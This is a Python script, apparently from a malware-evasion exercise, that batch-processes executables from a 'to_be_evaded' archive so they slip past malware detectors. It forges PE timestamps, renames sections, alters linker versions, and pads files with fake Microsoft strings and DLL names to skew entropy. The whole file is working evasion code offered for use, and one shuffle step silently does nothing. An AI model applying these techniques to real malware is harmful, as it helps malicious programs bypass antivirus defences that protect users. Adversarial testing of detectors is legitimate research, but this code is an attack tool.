#!/usr/bin/env python3
"""
Method 8 - Advanced Hybrid Attack

结合多种技术的混合攻击：
1. PE头混淆
2. 熵值调整
3. 良性overlay
4. 时间戳伪造
5. 节表重命名
"""

import argparse
import csv
import hashlib
import random
import shutil
import time
import zipfile
from pathlib import Path
import pefile
import struct
import math


METHOD_NAME = "method8_hybrid_advanced"
DEFAULT_ARCHIVE = Path(__file__).resolve().parents[1] / "to_be_evaded_ds.zip"
DEFAULT_WORK_ROOT = Path(__file__).resolve().parent / "artifacts" / METHOD_NAME
DEFAULT_OUTPUT_ZIP = Path(__file__).resolve().parent / f"{METHOD_NAME}_outputs.zip"


def extract_dataset(archive_path: Path, destination: Path) -> None:
    if not archive_path.exists():
        raise FileNotFoundError(f"input archive not found: {archive_path}")
    if destination.exists():
        shutil.rmtree(destination)
    destination.mkdir(parents=True, exist_ok=True)
    with zipfile.ZipFile(archive_path, "r") as zf:
        zf.extractall(destination)


def compress_outputs(source_dir: Path, archive_path: Path) -> None:
    archive_path.parent.mkdir(parents=True, exist_ok=True)
    if archive_path.exists():
        archive_path.unlink()
    with zipfile.ZipFile(archive_path, "w", zipfile.ZIP_DEFLATED) as zf:
        for path in sorted(source_dir.rglob("*")):
            if path.is_file():
                zf.write(path, path.relative_to(source_dir))


def collect_inputs(input_root: Path):
    return sorted(
        p
        for p in input_root.rglob("*")
        if p.is_file() and p.name != "sha256sums.txt"
    )


def sha256_of(path: Path) -> str:
    digest = hashlib.sha256()
    with path.open("rb") as handle:
        for chunk in iter(lambda: handle.read(65536), b""):
            digest.update(chunk)
    return digest.hexdigest()


def advanced_hybrid_attack(src: Path, dst: Path) -> bool:
    """
    高级混合攻击：结合多种技术
    """
    try:
        data = bytearray(src.read_bytes())
        orig_size = len(data)
        
        # 尝试PE修改
        pe_modified = False
        try:
            pe = pefile.PE(data=data)
            
            # 1. 修改时间戳
            if hasattr(pe, 'FILE_HEADER'):
                fake_timestamp = random.randint(1577836800, 1735689600)
                pe.FILE_HEADER.TimeDateStamp = fake_timestamp
            
            # 2. 重命名节表
            benign_names = [
                b'.text\x00\x00\x00',
                b'.code\x00\x00\x00',
                b'.data\x00\x00\x00',
                b'.rdata\x00\x00',
            ]
            for section in pe.sections:
                if section.Name:
                    new_name = random.choice(benign_names)
                    section.Name = new_name[:8].ljust(8, b'\x00')
            
            # 3. 修改版本信息
            if hasattr(pe, 'OPTIONAL_HEADER'):
                opt = pe.OPTIONAL_HEADER
                opt.MajorLinkerVersion = random.randint(11, 14)
                opt.MinorLinkerVersion = random.randint(0, 30)
            
            # 重新构建
            pe.write(dst)
            data = bytearray(dst.read_bytes())
            pe_modified = True
        except:
            # PE修改失败，使用原始数据
            pass
        
        if not pe_modified:
            data = bytearray(src.read_bytes())
        
        # 4. 添加多层overlay
        overlay_layers = []
        
        # Layer 1: 良性字符串
        layer1 = bytearray()
        benign_strings = [
            b"Microsoft Visual C++ Runtime Library\x00",
            b"Copyright (C) Microsoft Corporation\x00",
            b"This program cannot be run in DOS mode\x00",
            b"Rich\x00\x00\x00\x00",
        ]
        for _ in range(random.randint(50000, 150000)):
            layer1.extend(random.choice(benign_strings))
        overlay_layers.append(layer1)
        
        # Layer 2: 平衡熵值的数据
        layer2 = bytearray()
        for byte_val in range(256):
            count = random.randint(50, 500)
            layer2.extend(bytes([byte_val]) * count)
        random.shuffle(list(layer2))
        layer2 = bytearray(layer2)
        overlay_layers.append(layer2)
        
        # Layer 3: 重复模式（降低熵）
        layer3 = bytearray()
        patterns = [b"kernel32", b"user32", b"ntdll", b"msvcrt", b"advapi32"]
        for _ in range(random.randint(100000, 300000)):
            layer3.extend(random.choice(patterns))
        overlay_layers.append(layer3)
        
        # 合并所有层
        total_overlay = bytearray()
        for layer in overlay_layers:
            total_overlay.extend(layer)
        
        # 限制总大小（不超过5MB）
        max_overlay = 5_000_000 - len(data)
        overlay_size = min(len(total_overlay), max_overlay, 3_000_000)
        final_overlay = total_overlay[:overlay_size]
        
        # 写入最终文件
        final_data = data + bytes(final_overlay)
        dst.write_bytes(final_data)
        
        print(f"    Hybrid attack: {orig_size:,} + {len(final_overlay):,} = {len(final_data):,} bytes")
        return True
        
    except Exception as e:
        print(f"    Hybrid attack failed: {e}")
        # Fallback
        try:
            data = src.read_bytes()
            overlay = b"Microsoft Corporation\x00" * 100000
            max_overlay = min(2_000_000, 5_000_000 - len(data))
            final_data = data + overlay[:max_overlay]
            dst.write_bytes(final_data)
            return True
        except:
            return False


def main():
    parser = argparse.ArgumentParser(description=f"{METHOD_NAME} attack pipeline")
    parser.add_argument("--archive", type=Path, default=DEFAULT_ARCHIVE,
                        help="Input archive path")
    parser.add_argument("--output", type=Path, default=DEFAULT_OUTPUT_ZIP,
                        help="Output zip path")
    parser.add_argument("--work-dir", type=Path, default=DEFAULT_WORK_ROOT,
                        help="Working directory")
    
    args = parser.parse_args()
    
    print(f"=== {METHOD_NAME.upper()} ===")
    print(f"Input: {args.archive}")
    print(f"Output: {args.output}")
    print(f"Work dir: {args.work_dir}")
    
    # Extract
    input_dir = args.work_dir / "input"
    output_dir = args.work_dir / "output"
    extract_dataset(args.archive, input_dir)
    
    # Process
    inputs = collect_inputs(input_dir)
    print(f"\nProcessing {len(inputs)} files...")
    
    output_dir.mkdir(parents=True, exist_ok=True)
    report_rows = []
    sha256_list = []
    
    for src_path in inputs:
        dst_path = output_dir / src_path.name
        print(f"\n[{src_path.name}]")
        
        start_time = time.time()
        success = advanced_hybrid_attack(src_path, dst_path)
        elapsed = time.time() - start_time
        
        if success and dst_path.exists():
            orig_hash = sha256_of(src_path)
            new_hash = sha256_of(dst_path)
            report_rows.append({
                'original': src_path.name,
                'evasive': dst_path.name,
                'original_sha256': orig_hash,
                'evasive_sha256': new_hash,
                'success': True,
                'time_seconds': f"{elapsed:.2f}"
            })
            sha256_list.append(new_hash)
        else:
            report_rows.append({
                'original': src_path.name,
                'evasive': '',
                'original_sha256': sha256_of(src_path),
                'evasive_sha256': '',
                'success': False,
                'time_seconds': f"{elapsed:.2f}"
            })
    
    # Write reports
    report_csv = output_dir / "compare_report.csv"
    with open(report_csv, 'w', newline='') as f:
        writer = csv.DictWriter(f, fieldnames=['original', 'evasive', 'original_sha256', 'evasive_sha256', 'success', 'time_seconds'])
        writer.writeheader()
        writer.writerows(report_rows)
    
    sha256_txt = output_dir / "sha256sums.txt"
    with open(sha256_txt, 'w') as f:
        f.write('\n'.join(sha256_list))
    
    # Compress
    compress_outputs(output_dir, args.output)
    print(f"\n=== Complete ===")
    print(f"Output: {args.output}")
    print(f"Success: {sum(1 for r in report_rows if r['success'])}/{len(report_rows)}")


if __name__ == "__main__":
    main()

